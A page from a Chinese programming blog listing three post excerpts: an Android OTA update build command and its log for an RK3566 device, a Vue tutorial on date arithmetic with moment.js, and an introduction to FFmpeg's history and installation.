KVM:/data/workspace/RK_3566_USER_R11/rkcode_sdk11.0_r11$ ./build/tools/releasetools/ota_from_target_files -p out/host/linux-x86 -k build/target/product/security/testkey -i ../ota_diff_space/rk3566_r-target_XXX_V3.0.0.zip ../ota_diff_space/rk3566_r-target_XXX_V3.0.1.zip ../ota_diff_space/rk3566_r_ota_XXX_V3.0.0_to_V3.0.1.zip 2022-12-02 10:12:31 - common.py - WARNING : Failed to read SYSTEM/etc/build.prop 2022-12-02 10:12:31 - common.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f951faa6a515b68cbb57b1e2f858245/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0d56762d4f31f37818e0d555929fb92/" rel="bookmark">
			Vue 中 (moment)操作日期的加减与展示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
基本语法 ：
展示效果如下： 使用方式：
1、首先在 pacaage.json 中引入依赖 "moment": "^2.29.4"
2、然后命令行 install 安装 ：
3、最后，在使用的页面引入moment 4、data 中我定义了一个初始控制变量 ctrlEndDate ，用来控制可选择的截止时间为当前时间。
5、页面 view 编写时间选择器的元素
6、函数控制
总结
几种加日期的方法：
减日期时间
其他用法
基本语法 ： moment().add(Number, String);//通过类型添加 moment().add(Duration);//时间间隔duration moment().add(Object);//也可以使用对象 展示效果如下： 使用方式： 1、首先在 pacaage.json 中引入依赖 "moment": "^2.29.4" 2、然后命令行 install 安装 ： npm install moment 3、最后，在使用的页面引入moment import moment from "moment"; 4、data 中我定义了一个初始控制变量 ctrlEndDate ，用来控制可选择的截止时间为当前时间。 ctrlEndDate: moment().format("YYYY-MM-DD"), 这里我在 data 内部还定义了一个变量，用来存放工作经历的数组变量 personJobList
personJobList:[{}], 5、页面 view 编写时间选择器的元素 &lt;view class="mform" :hidden="tabbHidden" style="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0d56762d4f31f37818e0d555929fb92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e4aa3e8f9dd9fdbd5ab160d7f013c2f/" rel="bookmark">
			FFmpeg 快速上手：命令行详解、工具、教程、电子书
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FFmpeg 简介 FFmpeg 是一个开源的音视频处理工具，诞生已22年。它可以用来处理音视频的编解码、格式转换、剪辑、合并、抽取、压缩、解压缩、滤镜、字幕等等。它可以在 Windows、Linux、Mac 等多种平台上使用。
FFmpeg由法国天才程序员Fabrice Bellard在2000年时开发出初版。不过后来 FFmpeg 社区出现分裂，包括 Fabrice Bellard 在内的部分 FFmpeg 开发者决定脱离原组织重新创建新项目，称作 libav。后来 FFmpeg 项目负责人 Michael Niedermayer 将 libav 的代码合并到了 FFmpeg。
除了 FFmpeg，其他许多知名开源项目，诸如 TinyCC、QEMU、JSLinux 以及比较新的 QuickJS 均出自 Fabrice Bellard 之手，详情查看 https://bellard.org/。 FFmpeg 单词中的 “FF” 指的是 “Fast Forward（快速前进）”，MPEG 是制定国际标准的组织，负责制定影音压缩及传输的规格标准。
FFmpeg 耻辱柱 FFmpeg 最被人熟知的还有它创建的 “耻辱柱”（已于2014年下线，不过其 网页源码[1] 仍保留这些名单）。因为 FFmpeg 属于自由软件，采用了 LGPL 和 GPL 许可证（具体依据所选的组件），所以任何人都可以在遵守协议的情况下自由使用。不过很多播放软件使用了 FFmpeg 的代码后并没有遵守开源协议公开任何源代码。FFmpeg 社区便将违反开源协议的公司、组织和个人网站贴在 “耻辱柱”。韩国播放软件 KMPlayer 以及国产播放器暴风影音、QQ 影音都曾上过榜。
FFmpeg 安装 Windows Windows 平台上 FFmpeg 安装比较简单，只需要下载 FFmpeg 的压缩包，解压后将 bin 目录添加到环境变量即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e4aa3e8f9dd9fdbd5ab160d7f013c2f/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/86/">«</a>
	<span class="pagination__item pagination__item--current">87/220</span>
	<a class="pagination__item pagination__item--next btn" href="/page/88/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>